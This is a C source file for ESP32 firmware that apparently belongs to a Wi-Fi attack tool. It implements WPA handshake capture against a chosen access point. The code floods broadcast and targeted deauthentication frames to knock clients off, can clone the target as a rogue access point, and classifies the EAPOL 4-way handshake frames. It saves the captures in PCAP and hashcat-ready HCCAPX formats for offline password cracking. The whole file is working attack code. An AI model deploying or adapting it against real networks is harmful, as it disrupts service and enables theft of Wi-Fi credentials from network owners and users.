#define LOG_LOCAL_LEVEL ESP_LOG_INFO
/**
 * @file attack_handshake.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements handshake attacks and different available methods.
 */

#include "attack_handshake.h"

#include <string.h>
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "frame_analyzer_parser.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"
#include "wsl_bypasser.h"
#include "ble_comm.h"

static const char *TAG = "main:attack_handshake";
static attack_handshake_methods_t method = -1;
static const wifi_ap_record_t *ap_record = NULL;
static uint8_t current_attack_channel = 0;
static uint32_t last_deauth_ms = 0;

// Handshake status tracking
static uint32_t total_frames = 0;
static uint8_t eapol_mask = 0; // Bit 0: M1, Bit 1: M2, Bit 2: M3, Bit 3: M4
static uint32_t client_count = 0;
static uint8_t detected_clients[10][6]; // Track up to 10 unique clients

/**
 * @brief Sends a status update via BLE regarding the handshake capture progress.
 * 
 * Message format: HS_STATUS:TOTAL_FRAMES:EAPOL_MASK:CLIENT_COUNT:PCAP_SIZE
 */
static void send_handshake_status() {
    char status_msg[64];
    snprintf(status_msg, sizeof(status_msg), "HS_STATUS:%lu:%u:%lu:%u", 
             total_frames, eapol_mask, client_count, pcap_serializer_get_size());
    ble_comm_send_response(status_msg);
}

/**
 * @brief Utility to convert a byte array to a hex-encoded string.
 * @param src Pointer to source byte array.
 * @param len Length of source array.
 * @param dst Pointer to destination string buffer.
 */
static void bytes_to_hex(const uint8_t *src, size_t len, char *dst) {
    static const char hex_chars[] = "0123456789ABCDEF";
    for (size_t i = 0; i < len; i++) {
        dst[i * 2] = hex_chars[(src[i] >> 4) & 0x0F];
        dst[i * 2 + 1] = hex_chars[src[i] & 0x0F];
    }
    dst[len * 2] = '\0';
}

/**
 * @brief Event handler for captured EAPOL-Key (handshake) frames.
 * 
 * This function is triggered by the frame analyzer when an EAPOL frame is detected.
 * It handles channel tracking, real-time BLE propagation, robust handshake state detection,
 * and serialization into PCAP and HCCAPX formats.
 */
static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGI(TAG, "Got EAPoL-Key frame");
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;

    // Dynamic channel tracking: if we see EAPOL on a different channel, follow the target
    if (frame->rx_ctrl.channel != current_attack_channel) {
        ESP_LOGW(TAG, "Detected EAPOL on channel %u, but attacking on %u. Switching...", 
                 frame->rx_ctrl.channel, current_attack_channel);
        current_attack_channel = frame->rx_ctrl.channel;
        wifictl_set_channel(current_attack_channel);
    }

    total_frames++;

    // Send raw frame hex to the mobile app for real-time visualization and analysis
    char *hex_buf = (char *)malloc(frame->rx_ctrl.sig_len * 2 + 16);
    if (hex_buf) {
        strcpy(hex_buf, "HS_FRAME:");
        bytes_to_hex(frame->payload, frame->rx_ctrl.sig_len, hex_buf + 9);
        ble_comm_send_response(hex_buf);
        free(hex_buf);
    }

    // Identify which step of the 4-way handshake this is (M1-M4)
    eapol_packet_t *eapol_pkt = parse_eapol_packet((data_frame_t *) frame->payload);
    if (eapol_pkt) {
        eapol_key_packet_t *key_pkt = parse_eapol_key_packet(eapol_pkt);
        if (key_pkt) {
            key_information_t *info = &key_pkt->key_information;
            
            // Log key information for diagnostic purposes
            ESP_LOGI(TAG, "EAPOL Key Info: Ack=%u, MIC=%u, Secure=%u, KeyType=%u", 
                     info->key_ack, info->key_mic, info->secure, info->key_type);

            // Robust Handshake Detection Logic based on 802.11i standards:
            // M1: AP sends ANonce to Station (Ack=1, MIC=0, KeyType=1)
            if (info->key_ack && !info->key_mic && !info->install && info->key_type) {
                eapol_mask |= (1 << 0);
                ESP_LOGI(TAG, "Detected M1 handshake frame");
            }
            // M2: Station sends SNonce + MIC to AP (Ack=0, MIC=1, Secure=0, KeyType=1)
            else if (!info->key_ack && info->key_mic && !info->secure && info->key_type) {
                eapol_mask |= (1 << 1);
                ESP_LOGI(TAG, "Detected M2 handshake frame");
            }
            // M3: AP sends GTK + MIC to Station (Ack=1, MIC=1, KeyType=1)
            else if (info->key_ack && info->key_mic && info->key_type) {
                eapol_mask |= (1 << 2);
                ESP_LOGI(TAG, "Detected M3 handshake frame");
            }
            // M4: Station sends confirmation MIC to AP (Ack=0, MIC=1, Secure=1, KeyType=1)
            else if (!info->key_ack && info->key_mic && info->secure && info->key_type) {
                eapol_mask |= (1 << 3);
                ESP_LOGI(TAG, "Detected M4 handshake frame");
            }
        }
    }

    // Serialize the frame for later download
    attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
    pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
    hccapx_serializer_add_frame((data_frame_t *) frame->payload);

    send_handshake_status();
}

/**
 * @brief Event handler for newly detected clients on the target AP.
 * 
 * Tracks up to 10 unique clients and triggers targeted deauthentication 
 * to force them to re-handshake.
 */
static void client_detected_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    uint8_t *client_mac = (uint8_t *) event_data;
    
    // Deduplication logic for client tracking
    bool found = false;
    for (int i = 0; i < client_count && i < 10; i++) {
        if (memcmp(detected_clients[i], client_mac, 6) == 0) {
            found = true;
            break;
        }
    }

    if (!found && client_count < 10) {
        memcpy(detected_clients[client_count], client_mac, 6);
        client_count++;
        ESP_LOGI(TAG, "New client detected: %02x:%02x:%02x:%02x:%02x:%02x",
                 client_mac[0], client_mac[1], client_mac[2],
                 client_mac[3], client_mac[4], client_mac[5]);
        send_handshake_status();
    }
    
    // Active intervention: if in Broadcast or Rogue AP mode, send a targeted deauth
    // every 10 seconds to the client to force a re-handshake attempt.
    if ((method == ATTACK_HANDSHAKE_METHOD_BROADCAST || method == ATTACK_HANDSHAKE_METHOD_ROGUE_AP) && ap_record != NULL) {
        uint32_t now = esp_timer_get_time() / 1000;
        if (now - last_deauth_ms > 10000) { // 10 second cooldown to avoid radio congestion
            ESP_LOGI(TAG, "Sending targeted deauth to client");
            wsl_bypasser_send_deauth_frame_targeted(ap_record, client_mac);
            last_deauth_ms = now;
        }
    }
}

/**
 * @brief Configures and starts a handshake capture session.
 * @param attack_config Configuration including method, target AP, and channel.
 */
void attack_handshake_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting handshake attack...");
    
    // Reset internal state for a fresh capture session
    total_frames = 0;
    eapol_mask = 0;
    client_count = 0;
    last_deauth_ms = 0;
    memset(detected_clients, 0, sizeof(detected_clients));

    method = attack_config->method;
    ap_record = attack_config->ap_record;
    current_attack_channel = ap_record->primary;
    
    // Initialize serializers and hardware sniffer
    pcap_serializer_init();
    hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));
    wifictl_sniffer_filter_frame_types(true, true, false); // Filter for Management and Data frames
    wifictl_sniffer_start(ap_record->primary);
    
    // Start frame analysis for the specific target BSSID
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
    
    // Register for EAPOL and client discovery events
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_CLIENT_DETECTED, &client_detected_handler, NULL));
    
    // Dispatch method-specific background actions
    switch(attack_config->method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            // Periodically flood deauth packets to the whole AP
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
            attack_method_broadcast(ap_record, 2000); 
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            // Clone the target AP to trick clients into connecting
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
            attack_method_rogueap(ap_record);
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            // Just listen on the channel without any active transmissions
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
            break;
        default:
            ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_PASSIVE");
    }
}

/**
 * @brief Stops the handshake capture and cleans up all allocated resources.
 */
void attack_handshake_stop(){
    ESP_LOGI(TAG, "Stopping Handshake attack with method %d", method);
    
    // Send one final status update before stopping
    send_handshake_status();
    
    // Call method-specific cleanup functions
    switch(method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            wifictl_restore_ap_mac();
            wifictl_ap_stop();
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method %d! Attack may not be stopped properly.", method);
    }
    
    // Stop sniffing and analysis tasks
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    
    // Unregister event handlers to prevent memory leaks and dangling pointers
    esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler);
    esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_CLIENT_DETECTED, &client_detected_handler);
    
    ap_record = NULL;
    method = -1;
    ESP_LOGD(TAG, "Handshake attack stopped");
}

/**
 * @brief Sends a manual broadcast deauthentication frame to the target AP.
 */
void attack_handshake_request_deauth() {
    if (ap_record != NULL) {
        ESP_LOGI(TAG, "Manual deauth request received. Sending broadcast deauth.");
        wsl_bypasser_send_deauth_frame(ap_record);
        ble_comm_send_response("DEAUTH_SENT");
    } else {
        ESP_LOGW(TAG, "Manual deauth requested but no target AP selected!");
    }
}

uint8_t attack_handshake_get_eapol_mask() {
    return eapol_mask;
}